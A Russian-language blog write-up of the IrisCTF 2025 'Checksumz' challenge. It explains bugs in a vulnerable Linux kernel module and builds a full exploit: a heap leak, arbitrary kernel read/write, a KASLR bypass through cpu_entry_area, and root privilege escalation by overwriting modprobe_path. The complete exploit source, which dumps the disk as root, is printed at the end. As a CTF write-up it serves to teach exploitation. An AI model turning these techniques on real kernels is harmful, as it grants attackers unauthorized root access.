---
layout: post
title:  "IrisCTF 2025 — Checksumz"
date:   2024-01-10 13:37:00 +0300
categories: ctf writeup
tags: linux kernel pwn cpu_entry_area modprobe_path
---

*Подписывайтесь на TG канал [/b/exploits](https://t.me/sploitdev)*

В статье представлено решение задания на эксплуатацию модуля ядра Linux с прошедшего [IrisCTF 2025](https://ctftime.org/event/2503)

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250108150036.png)

Дан архив с окружением для запуска Linux-а с уязвимым модулем ядра.
Распакуем архив и получим следующие файлы:

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250108150145.png)

Нам интересна директория `chal-module` и файл с исходным кодом модуля `chal.c`

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250108150303.png)

Код модуля можно найти в [нашем репозитории](https://github.com/splodev/writeups/tree/main/CTFs/IrisCTF_2025/Checksumz/module)

Архив с заданием доступен по [ссылке](https://cdn.2025.irisc.tf/checksumz.tar.gz) (на момент января 2025)

Начнём разбор кода модуля по частям чтобы понять что он делает и какие интерфейсы взаимодействия предоставляет пользователю.

Первое что следует понять это как инициализируется драйвер. Это происходит в функции `checksumz_init`:
```c
static int __init checksumz_init(void)
{
	int err;

	if ((err = alloc_chrdev_region(&device_region_start, 0, 1, DEVICE_NAME)))
		return err;

	err = -ENODEV;

	if (!(device_class = checksumz_create_class()))
		goto cleanup_region;
	device_class->devnode = device_node;

	if (!device_create(device_class, NULL, device_region_start, NULL, DEVICE_NAME))
		goto cleanup_class;

	cdev_init(&device, &checksumz_fops);
	if ((err = cdev_add(&device, device_region_start, 1)))
		goto cleanup_device;

	return 0;

cleanup_device:
	device_destroy(device_class, device_region_start);
cleanup_class:
	class_destroy(device_class);
cleanup_region:
	unregister_chrdev_region(device_region_start, 1);
	return err;
}
```

Код не содержит ничего необычного. Можем найти структуру описывающую возможные операции над драйвером — `checksumz_fops`. Она передаётся вторым аргументом в функцию `cdev_init`. 

Взглянем на содержимое структуры:
```c
/* All the operations supported on this file */
static const struct file_operations checksumz_fops = {
	.owner = THIS_MODULE,
	.open = checksumz_open,
	.release = checksumz_release,
	.unlocked_ioctl = checksumz_ioctl,
	.write_iter = checksumz_write_iter,
	.read_iter = checksumz_read_iter,
	.llseek = checksumz_llseek,
};
```

Мы можем читать, писать, двигать указатель и отправлять IOCTL запросы к драйверу. Посмотрим как реализованы эти операции. Начнём с операции открытия драйвера - `checksumz_open`:
```c
/* This is the counterpart to open() */
static int checksumz_open(struct inode *inode, struct file *file) {
	file->private_data = kzalloc(sizeof(struct checksum_buffer), GFP_KERNEL);

	struct checksum_buffer* buffer = (struct checksum_buffer*) file->private_data;

	buffer->pos = 0;
	buffer->size = 512;
	buffer->read = 0;
	buffer->name = kzalloc(1000, GFP_KERNEL);
	buffer->s1 = 1;
	buffer->s2 = 0;

	const char* def = "default";
	memcpy(buffer->name, def, 8);

	for (size_t i = 0; i < buffer->size; i++)
		buffer->state[i] = 0;

	return 0;
}
```

Видим, что при открытии драйвера создаётся объект структуры `checksum_buffer` и инициализируется некоторыми значениями, а также в одно из полей записывается указатель на выделенную на куче память размером 1000 байт. 

Посмотрим на реализацию чтения из драйвера. Это функция `checksumz_read_iter`:
```c
static ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {
	struct checksum_buffer* buffer = iocb->ki_filp->private_data;
	size_t bytes = iov_iter_count(to);

	if (!buffer)
		return -EBADFD;
	if (!bytes)
		return 0;
	if (buffer->read >= buffer->size) {
		buffer->read = 0;
		return 0;
	}

	ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);

	buffer->read += copied;
	buffer->pos += copied;
	if (buffer->pos >= buffer->size)
		buffer->pos = buffer->size - 1;

	return copied;
}
```

Внимательно смотря на проверку размера можно увидеть, что она реализована не совсем корректно. Поле `buffer->read` инициализируется значением 0 и по логике чтения туда записывается количество считанных байт в буффер пользователя. Максимально за раз пользователь может считать 256 байт. Если пользователь осуществит два чтения по 256 байт, то поле `buffer->read` будет равно 512 и проверка размера не пройдёт.

Но если пользователь считает 256 байт в первый раз и 255 во второй, то поле `buffer->read` будет равно 511 и тогда мы сможем считать ещё раз 256 байт и таким образом считать больше данных, чем предусмотрено и получим какие-то данные с кучи. Для того, чтобы понять что мы будем читать достаточно взглянуть на структуру `checksum_buffer`:
```c
struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};
```

Мы читаем от начала поля `state`, это значит, что мы сможем получить указатель `name` и ещё данные с кучи. Это потенциально даёт нам утечку с помощью которой можно обойти KASLR. Попробуем проверить нашу гипотезу и прочитаем данные три раза из драйвера описанным ранее способом.

```c
void hexdump(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0 && i != 0) {
            puts("");
        }
        printf("%02x ", buffer[i]);
    }
};

uint64_t try_break_kaslr(int fd) {
    if (fd == INVALID_FD) { 
        return -1;
    }

    uint8_t* buffer = (uint8_t*) calloc(BUF_SIZE, sizeof(uint8_t));
    read(fd, buffer, BUF_SIZE); // skip
    read(fd, buffer, BUF_SIZE - 1); // skip

    memset(buffer, 0x0, BUF_SIZE);
    read(fd, buffer, 256); // leak

    hexdump(buffer, 256);
};

int main() {
	int fd = open("/dev/checksumz", O_RDWR);
	try_break_kaslr(fd);
}
```

Запустим и посмотрим на считанный буфер:

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250109024341.png)

Явно видно некоторый указатель и мы даже знаем, что это указатель на `name`, но это знание нам не даёт возможность получить адрес загрузки ядра. Запомним эту уязвимость и продолжим смотреть код.
Проанализируем как работает запись в драйвер. Это функция `checksumz_write_iter`:
```c
static ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {
        struct checksum_buffer* buffer = iocb->ki_filp->private_data;
        size_t bytes = iov_iter_count(from);
 
        if (!buffer)
			return -EBADFD;
        if (!bytes)
			return 0;

		ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from);
 
		buffer->pos += copied;
		if (buffer->pos >= buffer->size)
			buffer->pos = buffer->size - 1;
		
        return copied;
}
```

Как можно заметить, позиция `buffer->pos` не проверяется до копирования данных из пользовательского буфера. Это означает, что мы можем выставить позицию записи в самый конец и переписать байты в структуре после поля `state`. Но размер записи ограничен 16-ю байтами. Ещё раз взглянем на структуру `checksum_buffer`:
```c
struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};
```

Если мы оказываемся на последнем байте `state`, то мы можем полностью переписать поле `size` и поле `read` на 7 байт. Если мы сможем переписать поле `size`, то мы сможем установить позицию считывания куда угодно. Установка позиции чтения реализована в функции `checksumz_llseek` :
```c
static loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {
	struct checksum_buffer* buffer = file->private_data;

	switch (whence) {
		case SEEK_SET:
			buffer->pos = offset;
			break;
		case SEEK_CUR:
			buffer->pos += offset;
			break;
		case SEEK_END:
			buffer->pos = buffer->size - offset;
			break;
		default:
			return -EINVAL;
	}

	if (buffer->pos < 0)
		buffer->pos = 0;

	if (buffer->pos >= buffer->size)
		buffer->pos = buffer->size - 1;

	return buffer->pos;
}
```

Если `buffer->size` будет равен `0xffffffffffffffff`, то мы сможем поставить `buffer->pos` в любое значение, что позволит нам читать по произвольным адресам памяти. А ещё это даёт нам возможности писать данные по произвольному адресу, потому что логика работы записи тоже основана на значении `buffer->pos`.

Попробуем обойти KASLR и найти адрес загрузки ядра. Для начала поймём, что именно мы можем делать с чтением. 
1. Можно установить размер `buffer->size` таким, что мы сможем устанавливать любой `buffer->pos` через `lseek` на файл
2. Можно читать/писать относительно `buffer->state` который находится на хипе по неизвестному нам адресу

Мы имеем возможность относительного чтения. Значит, чтобы читать конкретный адрес который мы хотим, нам надо узнать относительно какого адреса пишем мы. Чтобы узнать это применим следующую стратегию:
1. Получим адрес указателя `buffer->name` через утечку описанную выше

2. Будем двигать `buffer->pos` вперёд и назад по 8 байт и читать данные в поисках строки "default" которая записывается поле `buffer->name` при открытии драйвера

3. Как только мы найдём эти данные — это будет означать, что мы читаем адрес который мы знаем и отняв/прибавив к нему смещение мы получим адрес относительно которого мы читаем. То есть адрес где лежит `buffer->state`

Реализуем это в коде:
```c
uint64_t try_break_kaslr(int fd) {
    if (fd == INVALID_FD) { 
        return -1;
    }

    uint8_t* buffer = (uint8_t*) calloc(BUF_SIZE, sizeof(uint8_t));
    read(fd, buffer, BUF_SIZE); // skip
    read(fd, buffer, BUF_SIZE - 1); // skip

    memset(buffer, 0x0, BUF_SIZE);
    read(fd, buffer, 256); // leak

    // get buffer->name pointer
    uint64_t leak_name = *(uint64_t*)(buffer + 17);
    printf("{+} heap leak name: 0x%llx\n", leak_name);

    // change size to 0xffffffffffffffff
    lseek(fd, (off_t)511, SEEK_SET);
    uint8_t write_buffer[16] = {0, 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 0, 0, 0, 0, 0, 0, 0};
    write(fd, write_buffer, 16);
    
    uint64_t content_addr = 0x0;

    for (int i = 0; i < 0x10000; i += 8) {
        char tmp_buf[8] = {0};
     
        lseek(fd, (off_t)512 + i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(+): 0x%llx\n", 512 + i);
            content_addr = leak_name - 512 - i;
            break;
        }

        lseek(fd, (off_t)0 - i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(-): 0x%llx\n", i);
            content_addr = leak_name + i;
            break;
        }
    }
    printf("{+} buffer->content: 0x%8lx\n", content_addr);
};
```

Запустим и посмотрим на полученные адреса:

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250110010544.png)

Можно проверить в отладчике, но кажется, что всё должно было сработать верно.
Теперь надо понять как превратить это в примитив для получения KASLR. 

Для этого можно использовать технику  `cpu_entry_area`. Для данной версии ядра (6.10.10) она сработает, но в новых она запатчена. Смысл техники в двух словах: у вас есть постоянный адрес на рандомизируемый KASLR-ом на котором есть адреса ядра и таким образом можно обойти KASLR если есть чтение произвольного адреса. Подробнее про технику можно прочитать в интернете.

Данная область памяти находится по адресу `0xfffffe0000000000`. Но эффективные адреса лежат со смещения 4. Прочитаем их и восстановим адрес загрузки ядра. Допишем нашу функцию до конца:
```c
uint64_t try_break_kaslr(int fd) {
    if (fd == INVALID_FD) { 
        return -1;
    }

    uint8_t* buffer = (uint8_t*) calloc(BUF_SIZE, sizeof(uint8_t));
    read(fd, buffer, BUF_SIZE); // skip
    read(fd, buffer, BUF_SIZE - 1); // skip

    memset(buffer, 0x0, BUF_SIZE);
    read(fd, buffer, 256); // leak

    // get buffer->name pointer
    uint64_t leak_name = *(uint64_t*)(buffer + 17);
    printf("{+} heap leak name: 0x%llx\n", leak_name);

    // change size to 0xffffffffffffffff
    lseek(fd, (off_t)511, SEEK_SET);
    uint8_t write_buffer[16] = {0, 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 0, 0, 0, 0, 0, 0, 0};
    write(fd, write_buffer, 16);
    
    uint64_t content_addr = 0x0;

    for (int i = 0; i < 0x1000000; i += 8) {
        char tmp_buf[8] = {0};
     
        lseek(fd, (off_t)512 + i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(+): 0x%llx\n", 512 + i);
            content_addr = leak_name - 512 - i;
            break;
        }

        lseek(fd, (off_t)0 - i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(-): 0x%llx\n", i);
            content_addr = leak_name + i;
            break;
        }
    }
    printf("{+} buffer->content: 0x%8lx\n", content_addr);

    uint64_t cpu_entry_area = 0xfffffe0000000004;
    // read cpu_entry_area
    lseek(fd, (off_t)(cpu_entry_area - content_addr), SEEK_SET);
    uint64_t kaslr_leak = 0;
    read(fd, &kaslr_leak, 8);

    printf("{+} KASLR leak: 0x%08llx\n", kaslr_leak);
    uint64_t kaslr_base = kaslr_leak - 0x1008e00;
    printf("{+} KASLR base: 0x%08llx\n", kaslr_base);
    
    return kaslr_base;
};
```

Запустим обновлённый код:

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250110015312.png)

С базой загрузки ядра мы можем переписать значение `modprobe_path` и получить повышение привилегий. Про эту технику тоже можно прочитать в интернете. Например, вот [здесь](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/). Суть техники в двух словах — есть некоторая переменная где записан путь до исполняемого файла который вызовется с правами рута при попытке запуска приложения с определённым magic-значением в заголовке. 
Допишем наш эксплоит. Записывать память будем всё также через установку `buffer->pos` и запись в файл через `write`.
```c
...
	uint64_t KASLR = try_break_kaslr(fd);
    if (KASLR == -1 || ((KASLR & 0xfffff) != 0)) {
        puts("kaslr invalid!");
        return 0;
    }
    uint64_t modeprobe = KASLR + 0x1b3f100;

    int trig_fd = open("/tmp/kek", O_RDWR | O_CREAT);
    write(trig_fd, "#!/bin/sh\ncat /dev/vda>/f\nchmod 777 f\n", 39);
    close(trig_fd);
    system("chmod 777 /tmp/kek");

    printf("{+} modeprobe_path: 0x%08llx\n", modeprobe);
    lseek(fd, (off_t)(modeprobe - relative_addr), SEEK_SET);
    write(fd, "/tmp/kek", 12);
    
    trig_fd = open("pek", O_RDWR | O_CREAT);
    write(trig_fd, "\xde\xad\xbe\xef", 4);
    close(trig_fd);

    system("chmod 777 ./pek; ./pek;");
```

Запускаем на сервере и получаем флаг:

![](/assets/IrisCTF-Checksumz/Pasted%20image%2020250110024519.png)

Полный эксплоит и заголовочный файл представлены ниже, а также доступны в [нашем репозитории](https://github.com/splodev/writeups/tree/main/CTFs/IrisCTF_2025/Checksumz).

main.c
```c
#include "api.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

uint64_t relative_addr = 0;

void hexdump(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0 && i != 0) {
            puts("");
        }
        printf("%02x ", buffer[i]);
    }
};

uint64_t try_break_kaslr(int fd) {
    if (fd == INVALID_FD) { 
        return -1;
    }

    uint8_t* buffer = (uint8_t*) calloc(BUF_SIZE, sizeof(uint8_t));
    read(fd, buffer, BUF_SIZE); // skip
    read(fd, buffer, BUF_SIZE - 1); // skip

    memset(buffer, 0x0, BUF_SIZE);
    read(fd, buffer, 256); // leak

    // get buffer->name pointer
    uint64_t leak_name = *(uint64_t*)(buffer + 17);
    printf("{+} heap leak name: 0x%llx\n", leak_name);

    // change size to 0xffffffffffffffff
    lseek(fd, (off_t)511, SEEK_SET);
    uint8_t write_buffer[16] = {0, 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 0, 0, 0, 0, 0, 0, 0};
    write(fd, write_buffer, 16);
    
    uint64_t content_addr = 0x0;

    for (int i = 0; i < 0x10000; i += 8) {
        char tmp_buf[8] = {0};
     
        lseek(fd, (off_t)512 + i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(+): 0x%llx\n", 512 + i);
            content_addr = leak_name - 512 - i;
            break;
        }

        lseek(fd, (off_t)0 - i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(-): 0x%llx\n", i);
            content_addr = leak_name + i;
            break;
        }
    }

    printf("{+} buffer->content: 0x%8lx\n", content_addr);
    uint64_t cpu_entry_area = 0xfffffe0000000004;
    // read cpu_entry_area
    lseek(fd, (off_t)(cpu_entry_area - content_addr), SEEK_SET);
    uint64_t kaslr_leak = 0;
    read(fd, &kaslr_leak, 8);

    printf("{+} KASLR leak: 0x%08llx\n", kaslr_leak);
    uint64_t kaslr_base = kaslr_leak - 0x1008e00;
    printf("{+} KASLR base: 0x%08llx\n", kaslr_base);
    relative_addr = content_addr;

    return kaslr_base;
};

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    int fd = open("/dev/checksumz", O_RDWR);
    uint64_t KASLR = try_break_kaslr(fd);
    if (KASLR == -1 || ((KASLR & 0xfffff) != 0)) {
        puts("kaslr invalid!");
        return 0;
    }
    uint64_t modeprobe = KASLR + 0x1b3f100;

    int trig_fd = open("/tmp/kek", O_RDWR | O_CREAT);
    write(trig_fd, "#!/bin/sh\ncat /dev/vda>/f\nchmod 777 f\n", 39);
    close(trig_fd);
    system("chmod 777 /tmp/kek");

    printf("{+} modeprobe_path: 0x%08llx\n", modeprobe);
    lseek(fd, (off_t)(modeprobe - relative_addr), SEEK_SET);
    write(fd, "/tmp/kek", 12);
    
    trig_fd = open("pek", O_RDWR | O_CREAT);
    write(trig_fd, "\xde\xad\xbe\xef", 4);
    close(trig_fd);

    system("chmod 777 ./pek; ./pek;");
}
```
api.h
```c
#ifndef CHECKSUMZ_API_H
#define CHECKSUMZ_API_H
/* You may want to include this from userspace code, since this describes the valid ioctls */

#include <sys/types.h>
#ifdef __KERNEL__
#include <linux/types.h>
#include <linux/ioctl.h>
#else /* !__KERNEL__ */
#include <stddef.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define __user /* __user means nothing in userspace, since everything is a user pointer anyways */
#endif

#define INVALID_FD -1
#define BUF_SIZE 256

struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t digest;
};

#define CHECKSUMZ_IOCTL_RENAME _IOWR('@', 0, char*)
#define CHECKSUMZ_IOCTL_PROCESS _IO('@', 1)
#define CHECKSUMZ_IOCTL_RESIZE _IOWR('@', 2, uint32_t)
#define CHECKSUMZ_IOCTL_DIGEST _IOWR('@', 3, uint32_t*)

#endif /* SONGBIRD_API_H */
```

*Подписывайтесь на TG канал [/b/exploits](https://t.me/sploitdev)*